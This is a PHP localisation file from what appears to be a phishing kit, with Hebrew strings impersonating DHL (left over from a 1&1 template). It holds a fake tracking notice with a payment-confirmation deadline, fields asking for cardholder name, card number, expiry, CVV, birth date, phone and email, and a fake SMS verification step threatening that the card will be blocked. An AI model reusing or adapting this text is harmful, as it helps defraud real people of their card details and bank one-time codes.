<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Welcome |', 										/* Title */
		'Fo9001'  => 'לקוחות פרטיים', 								/* Loading Header */
		'Fo9002' => 'לקוחות עסקיים', 								/* Loading P 1 */
		'LdngP2' => 'שלח חבילות,', 									/* Loading P 2 */
		'LdngP3' => 'קבלת חבילות', 									/* Loading P 3 */
		'LdngP4' => 'עזרה ויצירת קשר',  									/* Loading P 4 */
		'LdngP5'	 => 'מעקב אחר DHL.',	  							/* DHL TRACKING */
		'CntP'	 => 'כאן תוכלו למצוא מידע על המשלוחים שלכם.',	  								/* Control Panel */
		'CusId'	 => 'עקוב אחר משלוח מנות בכל עת, ממשלוח ועד משלוח',		  						/* Customer ID */
		'InpL1'	 => 'משלוח DHL',										/* Label Input 1 */
		'CusPs'	 => 'מספר מעקב 00340434139135232211 -',		  									/* Customer Password */
		'InpL2'	 => 'סטָטוּס: ',							/* Label Input 2 */
		'Rmmbr'	 => 'במשלוח',										/* Remember Me */
		'Lbtn'	 => 'הודעה חשובה!',											/* Login Btn */
		'Span1'	 => 'כדי להשלים את המסירה בהקדם, אשר את התשלום',				/* Are you still ... */
		'Span2'	 => 'על ידי לחיצה על הבא. יש לבצע אישור מקוון בתוך 14 הימים הבאים, לפני שתוקפו יפוג.',
		'Ntke'	 => 'הַבָּא',									/* Btn next */
		'AsdH2'	 => 'חבילת DHL',											/* Service */
		'AsdS1'	 => 'שירותי DHL',										/* MailXchange */
		'AsdS2'	 => 'DHL Express',						/* Detailed help and contact */
		'AsdS3'	 => 'DHL לוגיסטיקה',										/* Online FAQs */
		'AsdS4'	 => 'איש קשר',										/* GoToAssist */
		'P1H1'	 => 'עזרה ושירות לקוחות',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'תראה איך זה עובד',											/* Here's how it works */
		'P2H1'	 => 'אפליקציות סלולריות',								/* Microsoft Office 365 */
		'P2Pr'	 => 'עלינו',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Post DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'אַחֲרָיוּת',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'לחץ',									/* More information */
		'FtrS1'	 => 'קריירה',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => 'DHL International GmbH - כל הזכויות שמורות.',									/* Privacy Policy */
		'Sfokh'	 => 'אנו זקוקים לכתובתך כדי להבטיח שאנשים לא מורשים לא יוכלו לגשת לחבילות שלך.',									/* We need your address to be sure */
		'Ayam'	 => '10 ימי עבודה',									/* 10 working days */
		'Froth'	 => 'החל מהגעת החבילה שלך לסניף DHL, לאחר זמן זה, החבילה תוחזר לשולח.',									/* From the arrival of your package */
		'InptCC'	 => 'שם בעל הכרטיס',									/* Cardholder's name */
		'InptCCN'	 => 'מספר כרטיס אשראי',									/* Credit card number */
		'ExpMmAa'	 => 'תאריך תפוגה AA = MMMM',									/* Expir */
		'NumCvC'	 => 'COO (COC)',									/* CVV */
		'AddInf'	 => 'מָחוֹז',									/* Address */
		'CodPOs'	 => 'מיקוד',									/* Zip */
		'MdiNa'	 => 'עִיר',									/* Zip */
		'Zdiyad'	 => 'תאריך הלידה (יום / חודש / שנה',									/* DOB */
		'Farnon'	 => 'מספר טלפון',									/* Phone Number */
		'Barid'	 => 'האימייל שלך',									/* Your Email */
		'PlzCon'	 => 'אנא אשר את התשלום הבא.',									/* Please confirm the following */
		'Theun'	 => 'הסיסמה הייחודית נשלחה למספר הנייד המופיע למטה. אם אתה צריך לשנות את מספר הטלפון הסלולרי שלך, צור קשר עם הבנק שלך או שנה אותו דרך הערוצים הזמינים (כספומט, אינטרנט).',									/* Please confirm the following */
		'March'	 => 'סוֹחֵר:',									/* Merchant */
		'ExpDh'	 => 'DHL EXPRESS',									/* DHL EXPRESS */
		'Ch7al'	 => 'כמות:',									/* Amount */
		'Tarikh'	 => 'נתונים:',									/* Date */
		'TlNum'	 => 'מספר הטלפון שלך:',									/* Your Phone Number */
		'SmCos'	 => 'קוד SMS:',									/* Your SMS */
		'PlzSm'	 => 'הזן את קוד האימות שהתקבל בסמס:',				/* Please enter the */
		'Subnn'	 => 'שלח',				/* Submit */
		'AllCp'	 => 'DHL International GmbH - כל הזכויות שמורות.',				/* All Right */
		'SmEnv'	 => 'קוד SMS נשלח ...',				/* SMS code sent... */
		'SmWron'	 => 'ה- SMS שגוי או שפג תוקפו! לאחר (3) שגיאות בהזנת הקוד שהתקבל באמצעות SMS, העסקה הנוכחית מבוטלת וכרטיס האשראי נחסם.',				/* SMS is wrong */
		'LastSm'	 => 'תשומת הלב! הזן את ה- SMS האחרון שהתקבל',				/* SMS is wrong */
		'YouHav'	 => ''				/* SMS is wrong */
		
		
		
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 